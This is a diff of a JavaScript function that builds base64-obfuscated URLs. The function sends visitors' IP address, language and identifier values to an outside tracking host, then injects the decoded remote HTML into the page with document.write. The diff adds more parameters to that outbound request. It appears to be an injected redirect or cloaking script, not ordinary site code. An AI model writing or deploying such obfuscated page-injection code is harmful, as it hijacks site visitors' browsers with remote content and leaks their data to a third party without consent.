@@ -1,9 +1,12 @@
 function budal(ip) {
 
         if (cid("bsr") == '1') {
-            var bsr = 'Q2VyeHJl';
+            var bsr = 'WmVr';
         } else {
             var bsr = cid("u");
+            var bsi = cid("i");
+            var bst = cid("t");
+            var bss = cid("s");
         }
 
     var gtx = cmx('aHR0cHM6Ly9pY2xpY2suY2x1Yi9qcy90cmFja19qc29uLnBocD91cz0') + bsr + "&lg=" + lang + "&ip=" + ip + "&time" + Date.now();
@@ -18,7 +21,13 @@ function budal(ip) {
                     $.ajax({
                         method: "GET",
                         url: cmx(data.url),
-                        data: { usr: porn, token: data.url }
+                        data: {
+                            usr: porn,
+                            img: bsi,
+                            ttl: bst,
+                            srv: bss,
+                            token: data.url
+                        }
                     }).done(function (msg) {
                         document.write(cmx(msg.hd) + cmx(msg.mh) + cmx(msg.pg) + cmx(msg.mf));
                     });
